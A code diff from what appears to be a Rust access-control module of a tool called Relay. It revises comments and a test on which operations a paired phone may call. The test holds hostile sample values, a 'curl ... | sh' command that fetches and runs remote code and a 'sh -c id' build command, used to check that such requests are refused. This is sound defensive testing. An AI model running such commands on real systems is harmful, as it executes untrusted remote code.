@@ -126,10 +126,12 @@ pub enum Gate {
 /// What a paired phone may call: the ops the apps send (apps/relay-android, and Tally's sync),
 /// and nothing else.
 /// The socket door gives `user` the whole bus, which is right for a person at this machine's
-/// keyboard; a credential that lives on a phone, and can be lost with it, should not be able to
-/// reconfigure what the engine executes (`settings.set`, which holds `providers.*.path` and
-/// `device.adb_path`), quit the engine, or call ops no screen of the app uses. An op the app
-/// starts sending is added here. Sorted: `gate` binary-searches it.
+/// keyboard. A paired phone is the owner too, and is trusted to execute on this PC as them: it
+/// starts agents and shells, edits files and runs builds, so whoever holds its credential can
+/// run code here. What it may not do is weaken what holds agents back, reconfigure the engine
+/// (`settings.set`, which holds `providers.*.path` and `device.adb_path`), quit it, or call ops
+/// no screen of the app uses. An op the app starts sending is added here. Sorted: `gate`
+/// binary-searches it.
 pub const PHONE_OPS: &[&str] = &[
     // Aide on the phone (docs/AIDE.md): what it said and what waits on you, its jobs to run or
     // pause, and its facts to confirm or forget. Its settings stay on the PC, so a lost phone
@@ -264,12 +266,14 @@ fn asks_for_api_key(value: &serde_json::Value, op: &str) -> bool {
     value.pointer(at).is_some_and(|v| !matches!(v, serde_json::Value::Bool(false) | serde_json::Value::Null))
 }
 
-/// What a request would change about the commands the engine runs on its own, outside any
-/// agent's guardrail: a project's build and run commands (an integration build and Run on device
-/// hand them to the shell as they are), and the guardrail keys that decide what agents may
-/// execute and where they may write. `None` for anything else. A `null` build or run command
-/// goes back to Relay's default and is allowed; caps, protected paths and the destructive-write
-/// thresholds stay the phone's to tune.
+/// What a request would change that the PC alone sets: the guardrail keys that decide what agents
+/// may execute and where they may write, which a phone never loosens, and a project's build and
+/// run commands, which the engine hands to the shell as they are. The second is defence in
+/// depth, not a wall: a phone that may edit the repository and run builds can change what they
+/// execute in other ways (`gradlew`, `build.rs`, a cloned repository), and is trusted to, as the
+/// owner. `None` for anything else. A `null` build or run command goes back to Relay's default
+/// and is allowed; caps, protected paths and the destructive-write thresholds stay the phone's
+/// to tune.
 fn changes_what_runs(value: &serde_json::Value, op: &str) -> Option<&'static str> {
     const GUARDS: &str = "the commands agents may run and the folders they may write";
     let payload = &value["payload"];
@@ -338,9 +342,9 @@ pub fn gate_for(line: &str, instance: Instance, profile: OpProfile) -> Gate {
         BusError::refused("remote.publish", "publishing to Google Play is only from the desktop; a phone can build a release, not publish it")
             .with_hint("build it with publish off, then publish it from Relay on the PC")
     } else if let Some(what) = (profile == OpProfile::Phone).then(|| changes_what_runs(&value, op)).flatten() {
-        // A phone credential can be lost with the phone, and these are run with no agent and no
-        // guardrail between them and the PC's shell: `project.update {run_cmd}` and then
-        // `device.run` executed whatever a phone sent.
+        // A phone executes as the owner, but does not loosen agents' guardrails, and does not
+        // set the commands the PC runs with no agent in between (`project.update {run_cmd}` and
+        // then `device.run` ran whatever it sent): those change at the PC.
         BusError::refused("remote.command", format!("{what} are changed only from Relay on the PC"))
             .with_hint("change them in the project's settings on the PC")
     } else if profile == OpProfile::Phone && asks_for_api_key(&value, op) {
@@ -473,7 +477,7 @@ mod tests {
     }
 
     #[test]
-    fn a_phone_never_changes_what_the_pc_runs() {
+    fn a_phone_loosens_no_guardrail_and_sets_no_project_command() {
         let line = |op: &str, payload: &str| format!(r#"{{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0009","actor":"user","op":"{op}","payload":{payload}}}"#);
         // The phone still renames, pins and re-bases a project, puts its commands back to
         // Relay's default, tunes the guardrails' caps and thresholds, and runs on a device.
@@ -492,7 +496,8 @@ mod tests {
         ] {
             assert!(matches!(gate(&line(op, payload), Instance::Stable), Gate::Forward), "{op} {payload}");
         }
-        // `project.update {run_cmd}` and then `device.run` executed whatever the phone sent.
+        // `project.update {run_cmd}` and then `device.run` ran whatever the phone sent; a
+        // guardrail patch or reset lifted what holds agents back.
         for (op, payload) in [
             ("project.update", r#"{"project_id":1,"run_cmd":"curl -s https://example.invalid/x | sh"}"#),
             ("project.update", r#"{"project_id":1,"name":"Relay","build_cmd":"sh -c id"}"#),
